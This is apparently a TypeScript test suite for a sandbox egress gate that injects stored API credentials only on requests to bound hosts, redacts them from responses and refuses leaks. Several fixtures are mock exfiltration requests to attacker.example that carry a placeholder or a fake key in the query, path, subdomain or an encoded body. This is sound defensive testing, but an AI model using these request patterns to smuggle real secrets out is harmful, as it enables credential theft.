/**
 * Placeholder-gated injection (#331), on the service: per-connection placeholders, the egress decision and its
 * refusals, and the connection rules, approvals and session visibility it shares with the connection tools. The same
 * cases run through a real sandbox shell on both targets (apps/cloudflare and apps/selfhosted `connection-egress`).
 */
import { connectionSchema, schemaProblem } from "@kantel/api";
import openapi from "@kantel/api/openapi.json" with { type: "json" };
import {
	type AuditEventInput,
	type CallContext,
	KantelError,
	type SessionDirectory,
	type SessionRecord,
	systemContext,
} from "@kantel/contracts";
import { createAesGcmCipher, randomCipherKey } from "@kantel/vault/cipher";
import { createVault } from "@kantel/vault/engine";
import { createMemoryVaultStore } from "@kantel/vault/store";
import { describe, expect, it } from "vitest";
import { connectionEgress } from "../src/egress.ts";
import { isEgressRefusal } from "../src/egress-conformance.ts";
import {
	EGRESS_REFUSAL_SCHEMA,
	type EgressDraft,
	fingerprintsOf,
	placeholderEnvName,
	placeholdersIn,
	rawSecretIn,
	redactBytes,
	substitute,
} from "../src/egress-gate.ts";
import { memoryCredentials } from "../src/memory.ts";
import { createMemoryConnectionsRepository } from "../src/repository.ts";
import { createConnections, type EgressOutcome } from "../src/service.ts";
import { fakeAccess, human, ORG } from "../src/testing.ts";

const SYSTEM = systemContext("test");
const admin = human("admin");
const approver: CallContext = { actor: { kind: "human", userId: "admin" }, organisationId: ORG };
const KEY = "sk-live-abcdefghijklmnopqrstuv";
const SESSION = { organisationId: ORG, sessionId: "ses_1" };

const record = (overrides: Partial<SessionRecord> = {}): SessionRecord => ({
	id: "ses_1",
	organisationId: ORG,
	agentId: "agt_1",
	status: "idle",
	labels: {},
	createdBy: admin.actor,
	createdAt: 0,
	updatedAt: 0,
	...overrides,
});

const draft = (url: string, headers: [string, string][] = [], body?: string, method = "GET"): EgressDraft => ({
	method,
	url,
	headers,
	...(body === undefined ? {} : { body: new TextEncoder().encode(body) }),
});

function setup(options: { readonly answer?: (url: string, init?: RequestInit) => Response } = {}) {
	const sent: { url: string; method: string; headers: Headers; body?: string }[] = [];
	const events: AuditEventInput[] = [];
	const sessions = new Map<string, SessionRecord>([["ses_1", record()]]);
	const directory: Pick<SessionDirectory, "get"> = {
		async get(_ctx, sessionId) {
			const found = sessions.get(sessionId);
			if (found === undefined) throw new KantelError("not_found", `No session ${sessionId}`);
			return found;
		},
	};
	const vault = createVault({
		store: createMemoryVaultStore(),
		cipher: createAesGcmCipher({ key: randomCipherKey() }),
		audit: { append: async (_ctx, batch) => void events.push(...batch) },
	});
	const credentials = memoryCredentials();
	const repository = createMemoryConnectionsRepository();
	const connections = createConnections({
		repository,
		credentials,
		audit: { append: async (_ctx, batch) => void events.push(...batch) },
		access: fakeAccess(["admin"]),
		deployment: { origin: "https://harbour.test", clientMetadataPublic: false },
		approvals: vault,
		sessions: directory,
		fetch: async (url, init) => {
			const body = init?.body;
			sent.push({
				url,
				method: init?.method ?? "GET",
				headers: new Headers(init?.headers),
				...(body instanceof Uint8Array ? { body: new TextDecoder().decode(body) } : {}),
			});
			return (
				options.answer?.(url, init) ??
				new Response(`you sent ${new Headers(init?.headers).get("authorization") ?? url}`, {
					headers: { "x-seen": new Headers(init?.headers).get("x-api-key") ?? "" },
				})
			);
		},
	});
	const connect = (overrides: { name?: string; hosts?: string[]; value?: string; owner?: "org" | "alice" } = {}) =>
		connections.connectKey(overrides.owner === "alice" ? human("alice") : admin, {
			owner:
				overrides.owner === "alice"
					? { kind: "user", organisationId: ORG, userId: "alice" }
					: { kind: "organisation", organisationId: ORG },
			name: overrides.name ?? "Example",
			custom: { hosts: overrides.hosts ?? ["api.example.com"], injection: { kind: "bearer" }, kind: "http" },
			value: overrides.value ?? KEY,
			usage:
				overrides.owner === "alice"
					? { unattended: false, visibility: "private" }
					: { unattended: true, visibility: "shared" },
		});
	return { connections, sent, events, sessions, connect, vault, repository, credentials };
}

const refusalOf = (outcome: EgressOutcome) => {
	expect(outcome.kind).toBe("refused");
	if (outcome.kind !== "refused") throw new Error("not refused");
	// Against the published schema (the API's `EgressRefusal` component), and the conformance cases' own check.
	expect(schemaProblem(connectionSchema.EgressRefusal, outcome.refusal)).toBeUndefined();
	expect(isEgressRefusal(outcome.refusal)).toBe(true);
	return outcome.refusal;
};

describe("the published refusal schema", () => {
	it("is in the OpenAPI document, and the conformance cases check the same codes and fixes", () => {
		const schemas = (openapi as { components: { schemas: Record<string, unknown> } }).components.schemas;
		const published = schemas.EgressRefusal as {
			required: string[];
			properties: { fix: { properties: { action: { anyOf: { const: string }[] } } } };
		};
		const codes = (schemas.EgressRefusalCode as { anyOf: { const: string }[] }).anyOf.map((each) => each.const);
		expect(published.required).toEqual(["error", "message"]);
		expect(codes).toEqual([...EGRESS_REFUSAL_SCHEMA.properties.error.enum]);
		expect(published.properties.fix.properties.action.anyOf.map((each) => each.const)).toEqual([
			...EGRESS_REFUSAL_SCHEMA.properties.fix.properties.action.enum,
		]);
		expect(Object.keys((published as unknown as { properties: object }).properties).sort()).toEqual(
			Object.keys(EGRESS_REFUSAL_SCHEMA.properties).sort(),
		);
	});
});

describe("a connection's placeholder", () => {
	it("is random, its own, stable for its life, and gone with it", async () => {
		const env = setup();
		const a = await env.connect({ name: "A" });
		const b = await env.connect({ name: "B" });
		expect(a.placeholder).toMatch(/^kantel-cn-[0-9a-f]{32}$/);
		expect(b.placeholder).toMatch(/^kantel-cn-[0-9a-f]{32}$/);
		expect(a.placeholder).not.toBe(b.placeholder);
		await env.connections.rotateKey(admin, a.id, { value: `${KEY}-next` });
		expect((await env.connections.get(admin, a.id)).placeholder).toBe(a.placeholder);
		// Never the secret, nor derived from it.
		expect(JSON.stringify(await env.connections.get(admin, a.id))).not.toContain(KEY);

		await env.connections.remove(admin, a.id);
		const refused = refusalOf(
			await env.connections.egress(
				SYSTEM,
				SESSION,
				draft("https://api.example.com/v1", [["authorization", a.placeholder!]]),
			),
		);
		expect(refused.error).toBe("unknown_placeholder");
		expect(env.sent).toHaveLength(0);
	});

	it("is given to a connection made before placeholders the first time a session lists it", async () => {
		const env = setup();
		const made = await env.connect();
		// As a connection stored before #331: no placeholder and no index entry.
		const stored = await env.repository.get<{ connection: { placeholder?: string } }>("connection", made.id);
		const { placeholder: _old, ...connection } = stored!.value.connection;
		await env.repository.update("connection", made.id, stored!.revision, { ...stored!.value, connection });
		await env.repository.remove("placeholder", made.placeholder!);

		const environment = await env.connections.egressEnvironment(SYSTEM, SESSION);
		const given = (await env.connections.get(admin, made.id)).placeholder;
		expect(given).toMatch(/^kantel-cn-[0-9a-f]{32}$/);
		expect(given).not.toBe(made.placeholder);
		expect(environment).toEqual({ KANTEL_CONNECTION_EXAMPLE: given });
		const usable = await env.connections.usable(SYSTEM, {
			organisationId: ORG,
			sessionId: "ses_1",
			agentId: "agt_1",
			audience: { kind: "shared" },
		});
		expect(usable[0]).toMatchObject({ placeholder: given, env: "KANTEL_CONNECTION_EXAMPLE" });
	});

	it("names its sandbox variable after the connection, uniquely", () => {
		const taken = new Set<string>();
		const first = placeholderEnvName("GitHub (work)", taken);
		taken.add(first);
		expect(first).toBe("KANTEL_CONNECTION_GITHUB_WORK");
		expect(placeholderEnvName("github work", taken)).toBe("KANTEL_CONNECTION_GITHUB_WORK_2");
		expect(placeholderEnvName("✨", new Set())).toBe("KANTEL_CONNECTION_UNNAMED");
	});
});

describe("the egress gate", () => {
	it("sends a placeholder's credential to a bound host, records the use, and cuts it out of the answer", async () => {
		const env = setup();
		const connection = await env.connect();
		const outcome = await env.connections.egress(
			SYSTEM,
			{ ...SESSION, toolCallId: "call_1" },
			draft("https://api.example.com/v1/me", [["authorization", connection.placeholder!]]),
		);
		expect(outcome.kind).toBe("sent");
		if (outcome.kind !== "sent") return;
		expect(env.sent[0]!.headers.get("authorization")).toBe(`Bearer ${KEY}`);
		expect(new TextDecoder().decode(outcome.body)).toBe("you sent [redacted]");
		expect(outcome.redactions).toBe(1);
		const [use] = (await env.connections.listUses(admin, { connectionId: connection.id })).items;
		expect(use).toMatchObject({
			outcome: "allowed",
			egress: true,
			kind: "http",
			host: "api.example.com",
			toolCallId: "call_1",
		});
	});

	it("lets a request with no placeholder through untouched, and never adds a credential to it", async () => {
		const env = setup();
		await env.connect();
		const outcome = await env.connections.egress(SYSTEM, SESSION, draft("https://api.example.com/public"));
		expect(outcome).toEqual({ kind: "pass" });
		expect(env.sent).toHaveLength(0);
	});

	it("refuses a placeholder sent to another host as host_not_bound, sends nothing, and records why", async () => {
		const env = setup();
		const connection = await env.connect();
		const refused = refusalOf(
			await env.connections.egress(
				SYSTEM,
				SESSION,
				draft(`https://attacker.example/collect?t=${connection.placeholder}`),
			),
		);
		expect(refused).toMatchObject({
			error: "host_not_bound",
			connectionId: connection.id,
			fix: { action: "change_host" },
		});
		expect(refused.message).toContain("api.example.com");
		expect(env.sent).toHaveLength(0);
		const [use] = (await env.connections.listUses(admin, { connectionId: connection.id })).items;
		expect(use).toMatchObject({ outcome: "denied", egress: true, refusal: "host_not_bound", host: "attacker.example" });
		expect(
			env.events.some((event) => event.type === "connections.use.denied" && event.data?.refusal === "host_not_bound"),
		).toBe(true);
	});

	it("refuses a stored secret's own value as raw_secret, wherever it is and wherever it goes", async () => {
		const env = setup();
		const connection = await env.connect();
		const attempts = [
			draft("https://api.example.com/v1", [["authorization", `Bearer ${KEY}`]]),
			draft(`https://elsewhere.example/v1?k=${encodeURIComponent(KEY)}`),
			draft("https://elsewhere.example/v1", [["content-type", "application/json"]], JSON.stringify({ k: KEY }), "POST"),
			draft("https://elsewhere.example/v1", [["authorization", `Basic ${btoa(`${KEY}:`)}`]]),
			// In a URL's path, not glued to the host or the slashes around it.
			draft(`https://attacker.example/${KEY}`),
			draft(`https://attacker.example/v1/${KEY}.json`),
			// As a host name: the host is not recorded either.
			draft(`https://${KEY}.attacker.example/`),
			// A form, fully percent-encoded, whatever the content type's case.
			draft(
				"https://attacker.example/v1",
				[["content-type", "Application/X-Www-Form-Urlencoded"]],
				`k=${Array.from(KEY, (c) => `%${c.charCodeAt(0).toString(16)}`).join("")}`,
				"POST",
			),
			// A percent-encoded header.
			draft("https://attacker.example/v1", [["x-token", encodeURIComponent(KEY).replaceAll("-", "%2D")]]),
			// Even beside a good placeholder.
			draft("https://api.example.com/v1", [
				["authorization", connection.placeholder!],
				["x-leak", KEY],
			]),
		];
		for (const attempt of attempts) {
			const refused = refusalOf(await env.connections.egress(SYSTEM, SESSION, attempt));
			expect(refused).toMatchObject({
				error: "raw_secret",
				connectionId: connection.id,
				fix: { action: "use_placeholder" },
			});
			expect(JSON.stringify(refused)).not.toContain(KEY);
		}
		expect(env.sent).toHaveLength(0);
		const uses = (await env.connections.listUses(admin, { connectionId: connection.id })).items;
		expect(uses.map((use) => use.refusal)).toEqual(Array(attempts.length).fill("raw_secret"));
		// The canary is nowhere in the log: not the audit events, not the recorded uses.
		expect(JSON.stringify(env.events)).not.toContain(KEY);
		expect(JSON.stringify(uses)).not.toContain(KEY);
		expect(JSON.stringify(env.events)).not.toContain(encodeURIComponent(KEY));
	});

	it("screens a rotated key, and a key stored before screening once it has been used", async () => {
		const env = setup();
		const connection = await env.connect();
		await env.connections.rotateKey(admin, connection.id, { value: "sk-live-rotated-0123456789abcdef" });
		expect(
			refusalOf(
				await env.connections.egress(SYSTEM, SESSION, draft("https://x.example/?k=sk-live-rotated-0123456789abcdef")),
			).error,
		).toBe("raw_secret");
		// As a key stored before #331: no fingerprints until its first use through the gate.
		for (const each of await env.repository.list("fingerprint", { organisationId: ORG })) {
			await env.repository.remove("fingerprint", each.id);
		}
		expect(
			await env.connections.egress(SYSTEM, SESSION, draft("https://x.example/?k=sk-live-rotated-0123456789abcdef")),
		).toEqual({ kind: "pass" });
		await env.connections.egress(
			SYSTEM,
			SESSION,
			draft("https://api.example.com/v1", [["authorization", connection.placeholder!]]),
		);
		expect(
			refusalOf(
				await env.connections.egress(SYSTEM, SESSION, draft("https://x.example/?k=sk-live-rotated-0123456789abcdef")),
			).error,
		).toBe("raw_secret");
	});

	it("refuses https_required, ambiguous and unknown placeholders", async () => {
		const env = setup();
		const a = await env.connect({ name: "A" });
		const b = await env.connect({ name: "B" });
		expect(
			refusalOf(
				await env.connections.egress(
					SYSTEM,
					SESSION,
					draft("http://api.example.com/", [["authorization", a.placeholder!]]),
				),
			).error,
		).toBe("https_required");
		expect(
			refusalOf(
				await env.connections.egress(
					SYSTEM,
					SESSION,
					draft(`https://api.example.com/?b=${b.placeholder}`, [["authorization", a.placeholder!]]),
				),
			).error,
		).toBe("ambiguous_placeholder");
		expect(
			refusalOf(
				await env.connections.egress(
					SYSTEM,
					SESSION,
					draft("https://api.example.com/", [["authorization", "kantel-cn-00000000000000000000000000000000"]]),
				),
			).error,
		).toBe("unknown_placeholder");
		expect(env.sent).toHaveLength(0);
	});

	it("follows session visibility (#335): a person's private connection is refused in a shared session", async () => {
		const env = setup();
		const alice = await env.connect({ owner: "alice" });
		env.sessions.set("ses_1", record({ userId: "alice", visibility: "shared" }));
		const refused = refusalOf(
			await env.connections.egress(
				SYSTEM,
				SESSION,
				draft("https://api.example.com/v1", [["authorization", alice.placeholder!]]),
			),
		);
		expect(refused.error).toBe("connection_not_usable");
		// Not telling the session where the connection is bound.
		expect(refused.message).not.toContain("api.example.com");
		// Private to her, the same request goes out.
		env.sessions.set("ses_1", record({ userId: "alice", visibility: "private" }));
		const sent = await env.connections.egress(
			SYSTEM,
			SESSION,
			draft("https://api.example.com/v1", [["authorization", alice.placeholder!]]),
		);
		expect(sent.kind).toBe("sent");
	});

	it("applies the connection's rules (#332) and approvals (#333) as connection_request does", async () => {
		const env = setup();
		const connection = await env.connect();
		await env.connections.createRule(admin, connection.id, {
			who: { kind: "any" },
			what: { kind: "endpoint", method: "DELETE", path: "/**" },
			action: "deny",
		});
		await env.connections.createRule(admin, connection.id, {
			who: { kind: "any" },
			what: { kind: "endpoint", method: "POST", path: "/**" },
			action: "ask",
		});
		const auth: [string, string][] = [["authorization", connection.placeholder!]];
		expect(
			refusalOf(
				await env.connections.egress(SYSTEM, SESSION, draft("https://api.example.com/v1/x", auth, undefined, "DELETE")),
			).error,
		).toBe("rule_denied");
		const post = draft("https://api.example.com/v1/issues", auth, '{"title":"hi"}', "POST");
		const pending = refusalOf(await env.connections.egress(SYSTEM, SESSION, post));
		expect(pending).toMatchObject({ error: "approval_pending", fix: { action: "ask_approval" } });
		expect(pending.approvalId).toBeDefined();
		expect(env.sent).toHaveLength(0);
		const uses = (await env.connections.listUses(admin, { connectionId: connection.id })).items;
		expect(uses.map((use) => [use.outcome, use.refusal])).toEqual([
			["held", "approval_pending"],
			["denied", "rule_denied"],
		]);

		const proposal = await env.connections.approvalStatus(
			SYSTEM,
			{ organisationId: ORG, sessionId: "ses_1", agentId: "agt_1", audience: { kind: "shared" } },
			pending.approvalId!,
		);
		expect(proposal.terms.request).toMatchObject({ method: "POST", host: "api.example.com", path: "/v1/issues" });
		await env.vault.decide(approver, {
			proposalId: proposal.id,
			outcome: "approve",
			termsHash: proposal.termsHash,
			pickedCode: proposal.bindingCode,
		});
		// The approval is of the request exactly as the sandbox sent it: another cookie or Authorization is not covered.
		for (const extra of [
			["cookie", "session=other"],
			["x-extra", "1"],
		] as [string, string][]) {
			const changed = { ...post, headers: [...post.headers, extra] };
			expect(refusalOf(await env.connections.egress(SYSTEM, SESSION, changed)).error).toBe("approval_pending");
		}
		expect(env.sent).toHaveLength(0);
		const sent = await env.connections.egress(SYSTEM, SESSION, post);
		expect(sent.kind).toBe("sent");
		expect(env.sent[0]!.body).toBe('{"title":"hi"}');
		// The approval was for that request once.
		expect(refusalOf(await env.connections.egress(SYSTEM, SESSION, post)).error).toBe("approval_pending");
	});

	it("cuts the credential out of the reason phrase too", async () => {
		const env = setup({
			answer: (_url, init) =>
				new Response("no", { status: 400, statusText: `Bad ${new Headers(init?.headers).get("authorization")}` }),
		});
		const connection = await env.connect();
		const outcome = await env.connections.egress(
			SYSTEM,
			SESSION,
			draft("https://api.example.com/v1", [["authorization", connection.placeholder!]]),
		);
		if (outcome.kind !== "sent") throw new Error("not sent");
		expect(outcome.statusText).toBe("Bad [redacted]");
	});

	it("answers a redirect without following it, the credential cut out of its location", async () => {
		const env = setup({
			answer: (url) =>
				new Response(null, {
					status: 302,
					headers: { location: `https://elsewhere.example/?from=${new URL(url).searchParams.get("k")}` },
				}),
		});
		const connection = await env.connect();
		const outcome = await env.connections.egress(
			SYSTEM,
			SESSION,
			draft(`https://api.example.com/v1?k=${connection.placeholder}`),
		);
		expect(outcome.kind).toBe("sent");
		if (outcome.kind !== "sent") return;
		expect(outcome.status).toBe(302);
		expect(outcome.headers.location).toBe("https://elsewhere.example/?from=[redacted]");
		expect(env.sent).toHaveLength(1);
	});
});

describe("connectionEgress, the isolate's way out", () => {
	it("gives each command the placeholders and answers a refusal as a 403 with an EgressRefusal", async () => {
		const env = setup();
		const connection = await env.connect();
		const passed: string[] = [];
		const egress = connectionEgress({
			connections: env.connections,
			fetch: async (url) => {
				passed.push(url);
				return new Response("public");
			},
		});
		const lease = {
			id: "lease_1",
			sessionId: "ses_1",
			workspaceId: "ws_1",
			tier: "isolate" as const,
			baseVersion: 1,
			acquiredAt: 0,
			expiresAt: 1,
		};
		const command = await egress.forCommand({ ctx: { actor: admin.actor, organisationId: ORG }, lease });
		expect(command.env).toEqual({ KANTEL_CONNECTION_EXAMPLE: connection.placeholder });
		const refused = await command.fetch({
			method: "GET",
			url: "https://elsewhere.example/",
			headers: [["authorization", connection.placeholder!]],
		});
		expect(refused.status).toBe(403);
		expect(refused.headers["content-type"]).toBe("application/json");
		expect(JSON.parse(new TextDecoder().decode(refused.body))).toMatchObject({ error: "host_not_bound" });
		const open = await command.fetch({ method: "GET", url: "https://public.example/", headers: [] });
		expect(new TextDecoder().decode(open.body)).toBe("public");
		expect(passed).toEqual(["https://public.example/"]);
	});

	it("refuses rather than sends when the gate fails", async () => {
		const egress = connectionEgress({
			connections: {
				egress: async () => {
					throw new KantelError("unavailable", "The vault is down");
				},
				egressEnvironment: async () => ({}),
			} as never,
			fetch: async () => {
				throw new Error("must not be called");
			},
		});
		const command = await egress.forCommand({
			ctx: { actor: admin.actor, organisationId: ORG },
			lease: {
				id: "l",
				sessionId: "s",
				workspaceId: "w",
				tier: "isolate",
				baseVersion: 1,
				acquiredAt: 0,
				expiresAt: 1,
			},
		});
		const answer = await command.fetch({ method: "GET", url: "https://x.example/", headers: [] });
		expect(answer.status).toBe(403);
		expect(JSON.parse(new TextDecoder().decode(answer.body))).toMatchObject({ error: "egress_unavailable" });
	});
});

describe("the gate's pure parts", () => {
	it("finds placeholders in headers, URL and a JSON or form body, but not an opaque body", () => {
		const ph = "kantel-cn-0123456789abcdef0123456789abcdef";
		expect(placeholdersIn(draft(`https://a.example/${ph}`))).toEqual([ph]);
		expect(
			placeholdersIn(draft("https://a.example/", [["content-type", "application/json"]], `{"k":"${ph}"}`)),
		).toEqual([ph]);
		expect(placeholdersIn(draft("https://a.example/", [["content-type", "application/octet-stream"]], ph))).toEqual([]);
	});

	it("encodes the value for where the placeholder sits", () => {
		const ph = "kantel-cn-0123456789abcdef0123456789abcdef";
		const value = 'a b/"c"&d';
		const out = substitute(
			draft(`https://a.example/p/${ph}?k=${ph}`, [["content-type", "application/json"]], `{"k":"${ph}"}`, "POST"),
			[{ placeholder: ph, value }],
		);
		expect(out.url).toBe(`https://a.example/p/${encodeURIComponent(value)}?k=${encodeURIComponent(value)}`);
		expect(JSON.parse(new TextDecoder().decode(out.body))).toEqual({ k: value });
	});

	it("screens by fingerprint, and redacts binary bodies byte for byte", async () => {
		const known = new Set(await fingerprintsOf(KEY));
		expect(await rawSecretIn(draft(`https://a.example/?k=${KEY}`), known)).toBeDefined();
		expect(await rawSecretIn(draft("https://a.example/?k=sk-live-something-else-entirely"), known)).toBeUndefined();
		const bytes = new Uint8Array([0xff, ...new TextEncoder().encode(KEY), 0x00]);
		const clean = redactBytes(bytes, [KEY]);
		expect(clean.count).toBe(1);
		expect(Array.from(clean.bytes)).toEqual([0xff, ...new TextEncoder().encode("[redacted]"), 0x00]);
	});
});
